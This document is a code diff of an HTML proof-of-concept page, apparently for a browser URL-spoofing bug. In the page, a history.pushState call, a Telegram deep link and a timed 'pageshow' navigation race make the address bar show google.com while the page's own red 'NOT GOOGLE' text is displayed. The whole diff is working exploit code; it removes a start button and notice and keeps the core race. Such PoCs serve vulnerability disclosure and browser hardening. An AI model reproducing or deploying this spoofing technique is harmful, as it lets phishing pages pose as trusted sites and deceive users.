@@ -13,8 +13,8 @@ body {
 }
 
 button {
-  font-size: 15px;
-  padding: 10px 14px;
+  font-size: 16px;
+  padding: 12px 18px;
   border-radius: 10px;
   border: none;
   background: #007aff;
@@ -22,9 +22,8 @@ button {
 }
 
 #panel {
-  display: none;
   max-width: 420px;
-  margin: 80px auto;
+  margin: 100px auto;
   background: #fff;
   padding: 32px;
   border-radius: 16px;
@@ -33,64 +32,44 @@ button {
 }
 
 #spoof {
-  display: none;          /* ⬅️ DISEMBUNYIKAN DULU */
+  display: none; /* muncul BELAKANGAN */
+  margin-top: 20px;
   font-size: 28px;
   font-weight: 600;
   color: #b00020;
-  margin-top: 16px;
-}
-
-.notice {
-  margin-top: 14px;
-  font-size: 13px;
-  color: #666;
 }
 </style>
 </head>
 
 <body>
 
-<div style="text-align:center; margin-top:60px;">
-  <button id="trigger">Start PoC</button>
-</div>
-
 <div id="panel">
-  <button onclick="openTelegram()">Open Telegram</button>
+  <button onclick="start()">Start</button>
   <div id="spoof">NOT GOOGLE</div>
-  <div class="notice">Shown after URL becomes google.com</div>
 </div>
 
 <script>
 function logEvent() {}
 
-const panel  = document.getElementById('panel');
-const trigger = document.getElementById('trigger');
-const spoof  = document.getElementById('spoof');
+const spoof = document.getElementById('spoof');
 
-/* Open Telegram */
-function openTelegram() {
+/* Klik START */
+function start() {
+  history.pushState({}, '', '/trusted');
+
   setTimeout(() => {
     location.href = 'tg://resolve?domain=telegram';
-  }, 300);
+  }, 200);
 }
 
-/* Step 1 */
-trigger.onclick = () => {
-  logEvent("poc_started");
-  history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
-};
-
-/* Step 2: navigation race */
+/* Navigation race */
 window.addEventListener('pageshow', () => {
-  logEvent("pageshow");
-
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
         location.href = 'https://google.com:9090';
 
-        /* ⬇️ TAMPILKAN TEKS SETELAH NAVIGATION */
+        /* tampilkan teks SETELAH URL berubah */
         setTimeout(() => {
           spoof.style.display = 'block';
         }, 50);
